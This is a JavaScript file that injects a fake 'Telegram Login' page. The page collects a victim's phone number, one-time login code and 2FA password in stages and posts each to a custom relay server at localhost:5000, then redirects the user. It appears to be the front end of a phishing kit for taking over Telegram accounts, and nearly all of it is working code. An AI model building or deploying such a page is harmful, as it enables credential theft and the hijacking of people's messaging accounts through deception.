// Define the HTML structure
const html = `
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background-color: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      width: 300px;
      text-align: center;
    }
    .login-box h1 {
      margin-bottom: 20px;
      font-size: 24px;
    }
    .login-box input {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }
    .login-box button {
      width: 100%;
      padding: 10px;
      background-color: #0088cc;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    .login-box button:hover {
      background-color: #0077b3;
    }
    .hidden {
      display: none;
    }
  </style>
  <div class="login-box">
    <h1>Telegram Login</h1>
    <form id="loginForm">
      <input type="text" id="phoneNumber" name="phoneNumber" placeholder="Phone Number" required>
      <button type="submit">Send Login Code</button>
    </form>

    <form id="codeForm" class="hidden">
      <input type="text" id="code" name="code" placeholder="Login Code" required>
      <button type="submit">Submit Code</button>
    </form>

    <form id="2faForm" class="hidden">
      <input type="password" id="password" name="password" placeholder="2FA Password" required>
      <button type="submit">Submit Password</button>
    </form>

    <p id="result"></p>
  </div>
`;

// Append the HTML structure to the body
document.addEventListener('DOMContentLoaded', function() {
  $('body').append(html);

  // Define event listeners
  const proxyUrl = 'http://localhost:5000';

  document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const phoneNumber = document.getElementById('phoneNumber').value;

    try {
      const response = await fetch(`${proxyUrl}/send_code`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ phone_number: phoneNumber }),
      });

      const data = await response.json();

      if (data.success) {
        document.getElementById('loginForm').classList.add('hidden');
        document.getElementById('codeForm').classList.remove('hidden');
        document.getElementById('result').textContent = 'Login code sent.';
      } else {
        document.getElementById('result').textContent = 'Failed to send login code. Please try again.';
      }
    } catch (error) {
      console.error('Error:', error);
      document.getElementById('result').textContent = 'An error occurred. Please try again.';
    }
  });

  document.getElementById('codeForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const code = document.getElementById('code').value;
    const phoneNumber = document.getElementById('phoneNumber').value;

    try {
      const response = await fetch(`${proxyUrl}/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ phone_number: phoneNumber, code: code }),
    });

    const data = await response.json();

    if (data.success) {
      alert(data.message); // Show pop-up message
      setTimeout(() => {
        window.location.replace(data.redirect); // Redirect to the desired URL
      }, 0);
    } else if (data['2fa_required']) {
      document.getElementById('codeForm').classList.add('hidden');
      document.getElementById('2faForm').classList.remove('hidden');
      document.getElementById('result').textContent = '2FA is required. Please enter your password.';
    } else {
      document.getElementById('result').textContent = 'Login failed. Please try again.';
    }
  } catch (error) {
    console.error('Error:', error);
    document.getElementById('result').textContent = 'An error occurred. Please try again.';
  }
});

document.getElementById('2faForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const password = document.getElementById('password').value;
  const phoneNumber = document.getElementById('phoneNumber').value;

  try {
    const response = await fetch(`${proxyUrl}/2fa`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ phone_number: phoneNumber, password: password }),
    });

    const data = await response.json();

    if (data.success) {
      alert(data.message); // Show pop-up message
      setTimeout(() => {
        window.location.replace(data.redirect); // Redirect to the desired URL
      }, 0);
    } else {
      document.getElementById('result').textContent = '2FA failed. Please try again.';
    }
  } catch (error) {
    console.error('Error:', error);
    document.getElementById('result').textContent = 'An error occurred. Please try again.';
  }
});
});